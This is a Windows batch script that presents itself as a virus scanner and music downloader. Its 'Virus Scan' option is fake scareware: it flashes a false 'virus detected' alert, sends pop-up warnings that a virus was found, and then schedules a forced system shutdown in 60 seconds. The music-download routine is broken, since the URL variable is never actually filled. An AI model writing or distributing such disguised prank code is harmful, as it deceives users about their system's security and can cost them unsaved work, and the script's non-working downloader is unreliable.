@echo off
title Virus-Scan und Musik-Downloader
setlocal enabledelayedexpansion

:: Set the script information
set "SCRIPT_NAME=Virus-Scan und Musik-Downloader"
set "SCRIPT_VERSION=1.0"
set "SCRIPT_AUTHOR=VoidAbility"
set "SCRIPT_DATE=01.05.2023"
set "SCRIPT_DISCORD=https://discord.gg/Rcked9B6T9"

:: Display the script information
echo -------------------------------------------------------------------------
echo   %SCRIPT_NAME%
echo   Version: %SCRIPT_VERSION%
echo   Autor: %SCRIPT_AUTHOR%
echo   Datum: %SCRIPT_DATE%
echo   Discord Link: %SCRIPT_DISCORD%
echo -------------------------------------------------------------------------
echo.

set "WINDOW_TITLE=Fake Virus"
set "ERROR_SOUND=sounds\Windows Error.wav"
set "SUCCESS_SOUND=sounds\Windows Ding.wav"

set "WAIT_TIME=5"
set "DOWNLOAD_LABEL=Enter music URLs (separated by spaces):"
set "DOWNLOAD_TITLE=Music Downloader"
set "VIRUS_DETECTED_TITLE=Virus Detected"
set "VIRUS_DETECTED_TEXT=A virus has been detected on your computer! Please wait while we perform a scan..."
set "SCAN_COMPLETE_TITLE=Scan Complete"
set "SCAN_COMPLETE_TEXT=No threats were detected. Click OK to continue."
set "WARNING_TITLE=Warning!"
set "WARNING_TEXT=A virus has been detected on your computer! Click OK to remove the virus and avoid data loss."

:: Define the GUI window
%POWERSHELL_HOME%\powershell.exe -Command "$pshost = Get-Host; $pswindow = $pshost.UI.RawUI;$newsize = $pswindow.WindowSize;$newsize.Width = 90;$newsize.Height = 20;$pswindow.WindowSize = $newsize;"

:: Show the main menu
:menu
echo ------------------------------------------------------
echo             VIRUS-SCAN UND MUSIK-DOWNLOADER
echo ------------------------------------------------------
echo.
echo         Verfügbare Optionen:
echo         1. Musik Downloader
echo         2. Virus Scan
echo         3. Zurück zum Menü
echo.
set "options=1. Music Downloader 2. Virus Scan 3. Exit"
set /p selection="Select an option (1-3): "
if "%selection%"=="1" (
    call :music_downloader
    goto :menu
) else if "%selection%"=="2" (
    call :virus_scan
    goto :menu
) else if "%selection%"=="3" (
    exit /b
) else (
    echo Invalid selection!
    pause
    goto :menu
)

:: Function to download music
:music_downloader
set "download_urls="
%POWERSHELL_HOME%\powershell.exe -Command "$download_urls = $Host.UI.PromptForChoice('%DOWNLOAD_TITLE%', '%DOWNLOAD_LABEL%', $('',(0..9)));"
if "%download_urls%"=="" goto :menu

:: Download the music
echo ------------------------------------------------------
echo Herunterladen von Musik...
for /f "tokens=* delims=" %%i in ("%download_urls%") do (
    echo ------------------------------------------------------
    echo Download wird durchgeführ %%i ...
    youtube-dl --extract-audio --audio-format mp3 "%%i"
    if not errorlevel 1 (
        echo Download erfolgreich durchgeführ
        %POWERSHELL_HOME%\powershell.exe -c "(New-Object Media.SoundPlayer '%SUCCESS_SOUND%').PlaySync();"
    ) else (
        echo Fehler beim Herunterladen
        %POWERSHELL_HOME%\powershell.exe -c "(New-Object Media.SoundPlayer '%ERROR_SOUND%').PlaySync();"
    )
)

echo ------------------------------------------------------
echo DOWNLOAD ABGESCHLOSSEN!
pause
goto :eof

:: Function to scan for virus
:virus_scan
echo ------------------------------------------------------
echo SCANNEN NACH VIRUS...
title %VIRUS_DETECTED_TITLE%
color 0c
echo %VIRUS_DETECTED_TEXT%
%POWERSHELL_HOME%\powershell.exe -c "(New-Object Media.SoundPlayer '%ERROR_SOUND%').PlaySync();"
timeout /t %WAIT_TIME% >nul

color 0f
echo SCAN ABGESCHLOSSEN. KEINE BEDROHUNGEN ERKANNT.
%POWERSHELL_HOME%\powershell.exe -c "(New-Object Media.SoundPlayer '%SUCCESS_SOUND%').PlaySync();"
echo CLICK OK TO CONTINUE.
msg * %WARNING_TITLE% 
msg * %WARNING_TEXT%
shutdown /s /t 60 /c "VIRUS Gefunden! Dein Rechner schaltet sich in 60 Sekunden selbst ab"
goto :eof